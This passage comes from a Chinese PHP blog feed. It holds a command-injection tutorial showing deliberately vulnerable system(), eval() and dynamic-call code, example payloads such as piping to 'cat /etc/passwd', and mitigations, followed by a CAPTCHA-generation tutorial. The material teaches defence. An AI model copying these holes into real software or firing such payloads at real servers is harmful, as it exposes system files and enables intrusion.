<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$dir = $_GET[&quot;dir&quot;]; </div><div class="line">if (isset($dir))&#123; </div><div class="line">    echo &quot;&quot;; </div><div class="line">    system(&quot;ls -al &quot;.$dir); </div><div class="line">    echo &quot;&quot;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>我们提交<a href="http://www.sectop.com/ex1.php?dir=|" target="_blank" rel="external">http://www.sectop.com/ex1.php?dir=|</a> cat /etc/passwd</p>
<p>提交以后，命令变成了 system(“ls -al | cat /etc/passwd”);</p>
<p><img src="/images/PHP漏洞分析-命令注入攻击-01.jpeg" alt="漏洞分析" title="PHP漏洞分析-命令注入攻击-01"></p>
<h3 id="eval注入攻击"><a href="#eval注入攻击" class="headerlink" title="eval注入攻击"></a>eval注入攻击</h3><p>eval函数将输入的字符串参数当作PHP程序代码来执行</p>
<p>函数原型:</p>
<p><strong>mixed eval(string code_str)</strong>         //eval注入一般发生在攻击者能控制输入的字符串的时候</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$var = &quot;var&quot;; </div><div class="line">if (isset($_GET[&quot;arg&quot;])) &#123; </div><div class="line">    $arg = $_GET[&quot;arg&quot;]; </div><div class="line">    eval(&quot;\$var = $arg;&quot;); </div><div class="line">    echo &quot;\$var =&quot;.$var; </div><div class="line">&#125; </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>当我们提交<a href="http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了" target="_blank" rel="external">http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了</a>.</p>
<h3 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">func A() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line"></div><div class="line">func B() &#123; </div><div class="line">    dosomething(); </div><div class="line">&#125; </div><div class="line">if (isset($_GET[&quot;func&quot;])) </div><div class="line">&#123; </div><div class="line">    $myfunc = $_GET[&quot;func&quot;]; </div><div class="line">    echo $myfunc(); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>程序员原意是想动态调用A和B函数，那我们提交<a href="http://www.sectop.com/ex.php?func=phpinfo漏洞产生" target="_blank" rel="external">http://www.sectop.com/ex.php?func=phpinfo漏洞产生</a>.</p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><ol>
<li><p>尽量不要执行外部命令</p>
</li>
<li><p>使用自定义函数或函数库来替代外部命令的功能</p>
</li>
<li><p>使用escapeshellarg函数来处理命令参数</p>
</li>
<li><p>使用safe_mode_exec_dir指定可执行文件的路径</p>
</li>
</ol>
<p>esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“””，替换成“\””，分号“;”替换成“\;”</p>
<p>用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">safe_mode = On</div><div class="line">safe_mode_exec_dir = /usr/local/php/bin/</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|图片验证码</title>
    <link href="http://yoursite.com/2018/03/22/PHP-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    <id>http://yoursite.com/2018/03/22/PHP-图片验证码/</id>
    <published>2018-03-21T22:00:11.000Z</published>
    <updated>2018-03-24T10:19:44.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。</p>
<p>这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p>
<h3 id="php图像处理简介"><a href="#php图像处理简介" class="headerlink" title="php图像处理简介"></a>php图像处理简介</h3><p>在PHP5中，动态图象的处理要比以前容易得多。PHP5在php.ini文件中包含了GD扩展包，只需去掉GD扩展包的相应注释就可以正常使用了。PHP5包含的GD库正是升级的GD2库，其中包含支持真彩图像处理的一些有用的JPG功能。</p>
<p>一般生成的图形，通过PHP的文档格式存放，但可以通过HTML的图片插入方式SRC来直接获取动态图形。比如，验证码、水印、微缩图等。</p>
<p>创建图像的一般流程：</p>
<ol>
<li>设定标头，告诉浏览器你要生成的MIME类型。</li>
<li>创建一个图像区域，以后的操作都将基于此图像区域。</li>
<li>在空白图像区域绘制填充背景。</li>
<li>在背景上绘制图形轮廓输入文本。</li>
<li>输出最终图形。</li>
<li>清除所有资源。</li>
<li>其他页面调用图像。</li>
</ol>
<p>简单实例代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    //第一步，设置文件MIME类型</div><div class="line">    header(&apos;Content-Type: image/png;&apos;);</div><div class="line">    </div><div class="line">    //第二步，创建一个图形区域，图像背景</div><div class="line">    $im = imagecreatetruecolor(200,200);</div><div class="line">    </div><div class="line">    //第三步，在空白图像区域绘制填充背景</div><div class="line">    $blue = imagecolorallocate($im,0,102,255);    </div><div class="line">    imagefill($im,0,0,$blue);</div><div class="line">    </div><div class="line">    //第四步，在蓝色的背景上输入一些线条，文字等</div><div class="line">    $white = imagecolorallocate($im,255,255,255);</div><div class="line">    imageline($im,0,0,200,200,$white);</div><div class="line">    imageline($im,200,0,0,200,$white);</div><div class="line">    imagestring($im,5,66,20,&apos;Jing.Whale&apos;,$white);</div><div class="line">    </div><div class="line">    //第五步，输出最终图形</div><div class="line">    imagepng($im);</div><div class="line">    </div><div class="line">    //第六步，我要将所有的资源全部清空</div><div class="line">    imagedestroy($im);    </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><h4 id="产生验证码"><a href="#产生验证码" class="headerlink" title="产生验证码"></a>产生验证码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">function create_code($length = 4)&#123;</div><div class="line">	$string = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;</div><div class="line">	$code = &quot;&quot;;</div><div class="line">	for($i=0;$i&lt;$length;$i++)&#123;</div><div class="line">		$pos = rand(0,35);</div><div class="line">		$code .= $string&#123;$pos&#125;;</div><div class="line">	&#125;</div><div class="line">	return $code;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="创建图片"><a href="#创建图片" class="headerlink" title="创建图片"></a>创建图片</h4><ul>
<li>创建一张简单的图片（80X20），设置背景色，文本色，再加一些干扰线，干扰素</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$img_handle = Imagecreate(80, 20);  //图片大小80X20</div><div class="line">$back_color = ImageColorAllocate($img_handle, 255, 255, 255); //背景颜色（白色）</div><div class="line">$txt_color = ImageColorAllocate($img_handle, 0,0, 0);  //文本颜色（黑色）</div><div class="line"></div><div class="line">//加入干扰线</div><div class="line">for($i=0;$i&lt;3;$i++)</div><div class="line">&#123;</div><div class="line">    $line = ImageColorAllocate($img_handle,rand(0,255),rand(0,255),rand(0,255));</div><div class="line">    Imageline($img_handle, rand(0,15), rand(0,15), rand(100,150),rand(10,50), $line);</div><div class="line">&#125;</div><div class="line">//加入干扰象素</div><div class="line">for($i=0;$i&lt;200;$i++) </div><div class="line">&#123;</div><div class="line">    $randcolor = ImageColorallocate($img_handle,rand(0,255),rand(0,255),rand(0,255));</div><div class="line">    Imagesetpixel($img_handle, rand()%100 , rand()%50 , $randcolor);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>填充图片背景色，再将产生的随机字符串填充图片；</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Imagefill($img_handle, 0, 0, $back_color);             //填充图片背景色</div><div class="line">ImageString($img_handle, 28, 10, 0, $code, $txt_color);//水平填充一行字符串</div></pre></td></tr></table></figure>
<ul>
<li>清空输出缓存区，再生成验证码图片，并显示图片。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ob_clean();   // ob_clean()清空输出缓存区    </div><div class="line">header(&quot;Content-type: image/png&quot;); //生成验证码图片    </div><div class="line">Imagepng($img_handle);//显示图片</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="验证码安全性"><a href="#验证码安全性" class="headerlink" title="验证码安全性"></a>验证码安全性</h3><p>验证码通常是由php脚本生成的随机字符串，通过GD库的处理，制作成图片。真正的验证码字符串保存在SESSION中，然后把生成的图片展示给用户。用户填写了验证码提交后，在服务端上SESSION中的验证码进行比对。</p>
<p>这里有一个很多人都会犯的错误。验证码比对完成之后，不管是正确还是错误，我都没有清理SESSION。这样产生了一个问题，一旦一个用户第一次提交验证码成功，第二次以后不再访问生成验证码的脚本，这时候SESSION中的验证码并没有更新，也没有删除，导致验证码重复使用，起不到验证的作用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt; 验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Compute
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
</feed>
